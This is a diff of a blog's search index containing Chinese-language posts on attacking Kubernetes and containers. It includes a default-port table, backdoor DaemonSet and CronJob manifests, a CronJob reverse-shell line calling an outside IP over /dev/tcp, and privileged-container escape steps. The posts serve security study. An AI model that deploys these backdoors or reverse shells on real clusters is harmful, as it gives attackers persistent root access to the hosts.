@@ -1838,7 +1838,46 @@ Any-Header: burpcollaborator.net</pre>
 </blockquote>
 <span id="more"></span>
 
-<p>Kubernetes是容器编排平台的事实标准，具有较高的复杂性，自然也会产生安全问题。</p>
+<p>Kubernetes是容器编排平台的事实标准，具有较高的复杂性，使用到各种组件，但是组件和本身都可能存在漏洞。下面列举一下Kubernetes使用的组件常见开放端口</p>
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>默认端口</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>API Server</td>
+<td>6443</td>
+<td>基于HTTPS的安全端口</td>
+</tr>
+<tr>
+<td>API Server</td>
+<td>8080</td>
+<td>不安全的HTTP端口，不建议启用</td>
+</tr>
+<tr>
+<td>Kubelet</td>
+<td>10248</td>
+<td>用于检查Kubelet健康状态的HTTP端口</td>
+</tr>
+<tr>
+<td>Dashboard</td>
+<td>8001</td>
+<td>提供HTTP服务的端口</td>
+</tr>
+<tr>
+<td>etcd</td>
+<td>2379</td>
+<td>客户端与服务端通信的端口</td>
+</tr>
+<tr>
+<td>etcd</td>
+<td>2380</td>
+<td>不同服务端实例之间通信的端口</td>
+</tr>
+</tbody></table>
 <h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><h3 id="1-1-pod内获K8s-Server-Token"><a href="#1-1-pod内获K8s-Server-Token" class="headerlink" title="1.1 pod内获K8s Server Token"></a>1.1 pod内获K8s Server Token</h3><blockquote>
 <p>在Pod内收集token用于横向移动</p>
 </blockquote>
@@ -1919,7 +1958,7 @@ Any-Header: burpcollaborator.net</pre>
 
 
 <p>部署成功后的利用方式跟特权容器逃逸是一样的，可以参考：<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a></p>
-<h3 id="3-2-Daemonset后门"><a href="#3-2-Daemonset后门" class="headerlink" title="3.2 Daemonset后门"></a>3.2 Daemonset后门</h3><p>aemonset后门会在每个Node上部署一个后门</p>
+<h3 id="3-2-Daemonset后门Pod"><a href="#3-2-Daemonset后门Pod" class="headerlink" title="3.2 Daemonset后门Pod"></a>3.2 Daemonset后门Pod</h3><p>aemonset后门会在每个Node上部署一个后门</p>
 <p>从 v1.16 开始, 用 apps/v1 代替 extensions/v1beta1</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">hostPID:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">restartPolicy:</span> <span class="string">Always</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">backdoor-daemonset</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">        <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">81</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_PTRACE</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">AUDIT_CONTROL</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">MKNOD</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SETFCAP</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">            <span class="attr">mountPath:</span> <span class="string">/near_sandbox</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>
 
@@ -1928,7 +1967,7 @@ Any-Header: burpcollaborator.net</pre>
 
 
 
-<h3 id="3-3-部署K8s-CronJob后门"><a href="#3-3-部署K8s-CronJob后门" class="headerlink" title="3.3 部署K8s CronJob后门"></a>3.3 部署K8s CronJob后门</h3><p>CronJobs 对于创建周期性的、反复重复的任务很有用，例如执行数据备份或者发送邮件。 CronJobs 也可以用来计划在指定时间来执行的独立任务，例如计划当集群看起来很空闲时 执行某个 Job。</p>
+<h3 id="3-3-部署K8s-CronJob后门Pod"><a href="#3-3-部署K8s-CronJob后门Pod" class="headerlink" title="3.3 部署K8s CronJob后门Pod"></a>3.3 部署K8s CronJob后门Pod</h3><p>CronJobs 对于创建周期性的、反复重复的任务很有用，例如执行数据备份或者发送邮件。 CronJobs 也可以用来计划在指定时间来执行的独立任务，例如计划当集群看起来很空闲时 执行某个 Job。</p>
 <p>pod:</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">batch/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">CronJob</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-cronjob</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">schedule:</span> <span class="string">&quot;*/1 * * * *&quot;</span></span><br><span class="line">  <span class="attr">jobTemplate:</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">template:</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">backdoor-cronjob</span></span><br><span class="line">            <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">            <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">            <span class="attr">args:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">/bin/bash</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;/bin/bash &gt;&amp; /dev/tcp/172.16.42.101/4444 0&gt;&amp;1&quot;</span></span><br><span class="line">          <span class="attr">restartPolicy:</span> <span class="string">OnFailure</span></span><br></pre></td></tr></table></figure>
 
@@ -1948,7 +1987,7 @@ Any-Header: burpcollaborator.net</pre>
 <li>CVE-2019-9512漏洞使得kubernetes集群存在Ping Flood攻击风险：攻击者可以持续不断向HTTP/2对端发送PING帧，但不读取相应，促使对端维护一个内部队列存储产生的响应帧。如果响应帧入队列效率不高，可消耗大量CPU、内存资源。</li>
 <li>CVE-2019-9514漏洞使kubernetes集群存在Reset Flood攻击风险：攻击者可以开启若干个stream,在每个流上发送非法请求，这将促使对端发送一个RST_STREAM帧尝试终止。如果RST_STREAM帧入队列效率不高，可消耗大量CPU、内存资源。</li>
 </ul>
-<p><strong>4. Kubernetes网络中的中间人攻击</strong></p>
+<p><strong>4. Kubernetes网络中间人攻击</strong></p>
 <p>通过修改kube-dns服务的地址，可以在Kubernetes网络中完成中间人攻击。</p>
 <h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><p>&lt;&lt;云原生安全攻防实践与体系构建》</p>
 ]]></content>
@@ -2167,7 +2206,7 @@ Any-Header: burpcollaborator.net</pre>
 
 
 
-<h3 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h3><p>这个漏洞虽然可以逃逸，但是利用难度也是挺大的，需要宿主机用户进入容器才能触发。还有一些其他的动态连接库利用以及条件竞争产生的符号链接替换也可以用来逃逸，但是利用难度更大，这里不做说明</p>
+<h3 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h3><p>这个漏洞虽然可以逃逸，但是利用难度也是挺大的，需要宿主机用户进入容器才能触发。还有一些其他的动态连接库利用以及条件竞争产生的符号链接替换也可以用来逃逸，比如：CVE-2018-15664:符号链接替换漏洞，CVE-2019-14271:加载不受信任的动态链接。但是利用难度更大，实际使用效果不佳，这里不做说明。</p>
 <h2 id="4-通过Capabilities进行逃逸"><a href="#4-通过Capabilities进行逃逸" class="headerlink" title="4. 通过Capabilities进行逃逸"></a>4. 通过Capabilities进行逃逸</h2><h3 id="4-1-理解linux-Capabilities"><a href="#4-1-理解linux-Capabilities" class="headerlink" title="4.1 理解linux Capabilities"></a>4.1 理解linux Capabilities</h3><p>Linux内核中的Capabilities特性用于划分特权集，以便进程可以只分配“执行特定功能”的特权。<br> 在引入此特性前，如果进程需要使用网络，则必须使用root来运行，通常是sudo或者添加suid，那么普通用户在使用ping时，ping就可以运行任何特权。引入Capabilities特性后，可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。缺省ping具有cap_net_admin和cap_net_raw特权集</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">getcap</span> /bin/ping</span><br><span class="line">/bin/ping = cap_net_raw+ep</span><br></pre></td></tr></table></figure>
 
@@ -2189,7 +2228,7 @@ Any-Header: burpcollaborator.net</pre>
 <li><p>拥有 SYS_ADMIN 权限</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ docker run --name <span class="built_in">test</span> -td --cap-add=SYS_ADMIN busybox /bin/httpd -f</span><br><span class="line">12e311138f8638f602712e3abe9e42cbb4bfc5de39d14803c2c88893b8905bc7</span><br><span class="line">➜  ~ ps -ef | grep httpd | grep -v grep</span><br><span class="line">root       5561   5540  0 16:48 pts/0    00:00:00 /bin/httpd -f</span><br><span class="line">➜  ~ cat /proc/5561/status | grep -i <span class="built_in">cap</span></span><br><span class="line">CapInh:	00000000a82425fb</span><br><span class="line">CapPrm:	00000000a82425fb</span><br><span class="line">CapEff:	00000000a82425fb</span><br><span class="line">CapBnd:	00000000a82425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line">➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f</span><br><span class="line">➜  ~ capsh --decode=00000000a82425fb</span><br><span class="line">0x00000000a82425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="4-3-利用完全特权进行逃逸"><a href="#4-3-利用完全特权进行逃逸" class="headerlink" title="4.3 利用完全特权进行逃逸"></a>4.3 利用完全特权进行逃逸</h3><p>在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。</p>
+<h3 id="4-3-–privileged特权进行逃逸"><a href="#4-3-–privileged特权进行逃逸" class="headerlink" title="4.3 –privileged特权进行逃逸"></a>4.3 –privileged特权进行逃逸</h3><p>在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。</p>
 <ol>
 <li><p>启动一个特权容器环境</p>
 <figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> <span class="comment">--rm --privileged ubuntu /bin/bash</span></span><br></pre></td></tr></table></figure></li>
@@ -2565,6 +2604,32 @@ Any-Header: burpcollaborator.net</pre>
       </categories>
       <tags>
         <tag>Kubernetes</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>云原生攻击面</title>
+    <url>/%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E5%87%BB%E9%9D%A2/</url>
+    <content><![CDATA[<blockquote>
+<p>一切有为法，如梦幻泡影，如露亦如电，应作如是观。</p>
+</blockquote>
+<p>对云原生的攻击面做个归纳</p>
+<span id="more"></span>
+
+
+
+<p>攻击面如下：</p>
+<p><img src="../images/pic/%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E5%87%BB%E9%9D%A2.jpg"></p>
+<p>容器云部分参考，<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸</a>，<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%B9%B3%E5%8F%B0-Kubernetes%E5%AE%89%E5%85%A8/">容器编排平台-Kubernetes安全</a>，<a href="https://shadowfl0w.github.io/Kubernetes-API-Server-%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/">Kubernetes-API-Server-认证与授权</a></p>
+<h2 id="云原生应用风险"><a href="#云原生应用风险" class="headerlink" title="云原生应用风险"></a>云原生应用风险</h2><h3 id="1-传统应用风险"><a href="#1-传统应用风险" class="headerlink" title="1. 传统应用风险"></a>1. 传统应用风险</h3><p>跑在容器云环境下得应用也避免不了OWASP top 10应用风险，</p>
+<h3 id="2-API接口风险"><a href="#2-API接口风险" class="headerlink" title="2. API接口风险"></a>2. API接口风险</h3><p>虽然API接口风险也属于传统应用风险，但这个问题在云原生环境下更加突出，因为一个完整的应用被拆分成独立的模块，通过API接口进行交互，由于接口众多，导致管理困难，所有API接口风险是云原生应用的重大风险点</p>
+<h3 id="3-Serverless风险"><a href="#3-Serverless风险" class="headerlink" title="3. Serverless风险"></a>3. Serverless风险</h3><p>Serverless应用属于云原生应用，它需要参照云厂商的模板编写代码。Serverless是由事件触发的，但是事件本身来源并不可控。其他的使用的共有或者私有Serverless平台本身也可能存在安全问题，现在很多公有云厂商提供的Serverless服务被用来做攻击，存在滥用的风险，比如用来做扫描，隐藏c2。还有就是编写的Serverless代码可能存在漏洞导致被利用。</p>
+<h3 id="4-云原生应用架构安全"><a href="#4-云原生应用架构安全" class="headerlink" title="4. 云原生应用架构安全"></a>4. 云原生应用架构安全</h3><p>云原生应用一般采用微服务架构，微服务架构使用到的各种框架或者组件也是可能存在漏洞的，微服务下对认证和授权也是一大挑战，还有就是微服务的API管理，以及资产间隔离也是难点。</p>
+]]></content>
+      <categories>
+        <category>云原生安全</category>
+      </categories>
+      <tags>
+        <tag>云原生安全</tag>
       </tags>
   </entry>
 </search>
